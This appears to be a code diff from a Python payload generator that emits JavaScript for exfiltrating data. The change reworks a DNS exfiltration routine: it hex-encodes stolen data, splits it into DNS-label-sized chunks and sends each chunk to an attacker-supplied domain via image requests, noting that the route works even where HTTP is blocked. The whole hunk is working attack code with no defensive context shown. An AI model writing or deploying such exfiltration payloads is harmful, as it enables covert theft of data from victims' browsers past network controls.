@@ -65,11 +65,16 @@ class PayloadGenerator:
         exfil_code = ""
         if exfil_domain:
             exfil_code += f'''
-            // DNS exfil (works even if HTTP blocked)
+            // DNS exfil using hex (case-insensitive, survives DNS)
             const dnsExfil = (data) => {{
-                const encoded = btoa(data).replace(/[^a-zA-Z0-9]/g, '').slice(0, 60);
-                const img = new Image();
-                img.src = 'http://' + encoded + '.{exfil_domain}/x.png?' + Date.now();
+                // Convert to hex (case-insensitive, works with DNS)
+                const hex = Array.from(data).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
+                // Split into chunks (DNS label max 63 chars, use 60 for safety)
+                const chunks = hex.match(/.{{1,60}}/g) || [];
+                chunks.forEach((chunk, i) => {{
+                    const img = new Image();
+                    img.src = 'http://' + chunk + '.c' + i + '.{exfil_domain}/x.png?' + Date.now();
+                }});
             }};
             dnsExfil(data);'''
         
